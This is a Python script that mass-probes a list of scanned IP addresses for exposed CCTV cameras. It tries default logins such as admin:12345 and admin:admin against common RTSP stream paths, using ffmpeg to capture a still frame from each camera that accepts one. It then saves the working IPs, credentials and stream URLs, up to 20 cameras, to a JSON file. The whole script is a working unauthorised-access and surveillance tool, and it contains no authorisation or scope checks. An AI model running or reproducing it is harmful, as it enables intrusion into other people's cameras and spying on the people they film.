#!/usr/bin/env python3
"""Fast probe for 20 live cameras from pre-scanned list"""
import subprocess, os, json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

def load_targets(limit=50):
    targets = []
    with open(os.path.join(WORK_DIR, 'cam_targets.txt')) as f:
        for line in f:
            ip = line.strip()
            if ip and len(targets) < limit:
                targets.append(ip)
    return targets

def probe_rtsp(ip):
    creds = [('admin', ''), ('admin', '12345'), ('admin', 'admin')]
    paths = ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream']
    
    for user, passwd in creds:
        for rpath in paths:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=3, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    }
            except:
                pass
            try:
                if os.path.exists(frame):
                    os.remove(frame)
            except:
                pass
    return None

def main():
    print('[*] Loading targets...')
    targets = load_targets(limit=200)
    print(f'[*] Probing {len(targets)} IPs for 20 live cameras...\n')
    
    streams = []
    with ThreadPoolExecutor(max_workers=60) as pool:
        futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    print(f'[+] Stream #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B')
                    if len(streams) >= 20:
                        for f in futures:
                            f.cancel()
                        break
            except:
                pass
    
    print(f'\n[*] Found {len(streams)} live cameras')
    
    if streams:
        print('\n=== LIVE CAMERAS ===')
        for i, s in enumerate(streams, 1):
            print(f'{i:>2}. {s["ip"]:>16} | {s["user"]}:{s["password"]}')
            print(f'   {s["rtsp_url"]}')
        
        out_file = os.path.join(WORK_DIR, f'20_live_cams_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        with open(out_file, 'w') as f:
            json.dump({'count': len(streams), 'streams': streams}, f, indent=2)
        print(f'\n[+] Saved: {out_file}')

if __name__ == '__main__':
    main()
